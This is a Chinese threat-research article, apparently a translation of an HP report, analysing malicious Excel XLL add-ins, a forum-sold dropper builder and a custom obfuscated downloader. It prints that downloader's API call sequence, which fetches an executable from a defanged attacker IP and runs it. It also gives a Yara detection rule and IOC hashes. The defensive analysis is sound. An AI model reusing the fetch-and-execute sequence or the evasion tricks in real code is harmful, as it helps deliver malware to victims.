近期，研究人员发现使用恶意 Microsoft Excel 加载项（XLL）文件发起攻击的行动有所增加，这项技术的 MITRE ATT&CK 技术项编号为
`T1137.006`。

这些加载项都是为了使用户能够利用高性能函数，为 Excel 工作表提供 API 调用接口。与 VBA 等其他接口相比，该方式能够更有效地扩展 Excel
的能力，使其支持更多功能，例如多线程。现在，攻击者也滥用这项技术来达成自己的恶意目标。

攻击者将带有恶意 XLL 附件或者恶意链接的电子邮件发送给用户，受害者点击附件打开 Microsoft Excel 后会提示其安装并激活加载项。

![image.png-71.8kB](https://image.3001.net/images/20220120/1642675320_61e93c78e3fcec9d5a0f7.png!small)

提示信息

攻击者通常将代码置于 `xlAutoOpen`函数中，该函数会在加载项被激活时立即触发执行。这意味着，与要求用户启用宏的 VBA
宏不同，受害者只要打开就会执行恶意代码。

由于 XLL 是可移植的可执行文件，许多电子邮件网关都会拦截该格式的文件或者仅允许受信任签名的加载项。

## XLL 恶意软件出售

因为 XLL 恶意文件的快速增长，我们在地下犯罪论坛上进行了相应的调查，评估使用这种文件格式的恶意工具和服务的流行程度。

在读个地下犯罪论坛中，反复看到来自同一个攻击者的广告，正在销售一个可以创建 XLL Dropper 的构建工具。

![image.png-310.8kB](https://image.3001.net/images/20220120/1642675321_61e93c79aef4b8b5e6fd5.png!small)

地下论坛销售广告

用户指定一个可执行文件或下载诱饵文件的链接地址，生成 XLL 文件。

![image.png-144kB](https://image.3001.net/images/20220120/1642675322_61e93c7aa43644ea6b7ca.png!small)

构建工具截图

## EXCEL-DNA 生成加载项

发现的 XLL 文件大部分都有相同的结构，本质上说，XLL 文件是包含 `xlAutoOpen`导出函数的 DLL 文件。这些 XLL 文件应该是使用
[Excel-DNA](https://excel-dna.net/)工具生成的，包含多个大型的资源。

![image.png-198kB](https://image.3001.net/images/20220120/1642675323_61e93c7b93cc5910aa4ee.png!small)

文件资源段结构

其中包含 Excel-DNA 项目组件以及加载项，可以通过查看资源名或者同样存储在资源中的 XML 定义文件来识别包含 Excel 加载项的 XLL 文件。

![image.png-73kB](https://image.3001.net/images/20220120/1642675324_61e93c7ce113c53dfb414.png!small)

XML 文件

包含恶意代码的加载项是使用 .NET 开发的，位于 `MODDNA`资源中。要分析该恶意代码，需要将资源保存到硬盘并使用 LZMA 算法进行解压缩。对
.NET 文件进行反编译后，可见 XLL 加载项的启动函数，该加载项为恶意软件 Downloader。

![image.png-163.7kB](https://image.3001.net/images/20220120/1642675325_61e93c7d9336f8a1c3730.png!small)

.NET 文件代码

使用 Excel-DNA 项目创建的 XLL 文件也可以使用项目提供的脚本自动解压缩，该脚本将 XLL
文件的路径作为参数，然后提取、解压缩并将资源保存到文件夹中。

![image.png-166.9kB](https://image.3001.net/images/20220120/1642675326_61e93c7e55408b5ee0f6c.png!small)

提取 XLL 文件

## 自定义生成的加载项

其他不使用 Excel-DNA 的 XLL 文件中，一个 Downloader 大小只有 4.5 KB，但吸引了研究人员的注意。与其他 XLL
文件一样，该文件也具有导出函数 `xlAutoOpen`。为了混淆程序控制流，样本中包含许多连续的 `jmp`指令。

![image.png-328.1kB](https://image.3001.net/images/20220120/1642675327_61e93c7fefbea1515df75.png!small)

动态调试截图

经过分析后，研究人员发现可执行代码后有一段加密数据。数据在循环中解密，首先确定数据的位置与大小，紧接着进行异或解密。每处理八个字节，密钥就要对用改变。

![image.png-53.9kB](https://image.3001.net/images/20220120/1642675329_61e93c8132735fd53ba2a.png!small)

解密代码

一旦数据被解密，样本可以提取三个 DLL 文件名、五个 API 函数名、Payload 的 URL 以及存储 Payload
的本地文件路径。样本首先通过进程环境块（PEB）遍历 `InLoadOrderModuleList`正确解析所需 DLL 的基址，然后再找到希望调用的
API 函数地址。

![image.png-177kB](https://image.3001.net/images/20220120/1642675329_61e93c81b32f361dbf4eb.png!small)

解析加载模块

然后，恶意软件使用解析后的 API 函数下载 Payload 并将其存储执行。在此样本中，API 调用如下所示：

> GetProcAddress(“ExpandEnvironmentStringsW”)
>
> ExpandEnvironmentStringsW(“”%APPDATA%\joludn.exe””)
>
> LoadLibraryW(“UrlMon”)
>
> GetProcAddress(“URLToDownloadFile”)
>
> URLToDownloadFile(“hxxp://141.95.107[.]91/cgi/dl/8521000125423.exe”,
> “C:\Users\REDACTED\AppData\Roaming\joludn.exe”)
>
> _wsystem(“C:\Users\REDACTED\AppData\Roaming\joludn.exe”)

检测 XLL 恶意文件的 Yara 规则为：

> rule xll_custom_builder  
> {  
> meta:  
> description = "XLL Custom Builder"  
> author = "patrick.schlapfer@hp.com"  
> date = "2022-01-07"
>
> strings:  
> str2 = "test"  
> op2 = { 4D 31 0E }  
> op4 = { 49 39 C6 }
>
> condition:  
> uint16(0) == 0x5A4D and all of (op*) and filesize < 10KB  
> }

## 结论

Microsoft Excel 提供了许多合法执行代码的方式，如 Excel 4.0 宏、DDE 和
VBA，这些都已经被攻击者滥用。近期，研究人员发现，Dridex、Agent Tesla、Raccoon Stealer 和 Formbook
等恶意软件家族也开始利用 XLL 文件进行传播。利用 XLL 文件攻击的数量增长，表明攻击者对这种技术很感兴趣。

## IOC

> 380f15a57aee6d2e6f48ed36dd077be29aa3a3eb05bfb15a1a82b26cfedf6160  
> c314c7feeb98de6391da83678e1639aade3fbe9c95846b8c2f2590ea3d34dd4f

## 参考来源

> [HP](https://threatresearch.ext.hp.com/how-attackers-use-xll-malware-to-> infect-systems/)

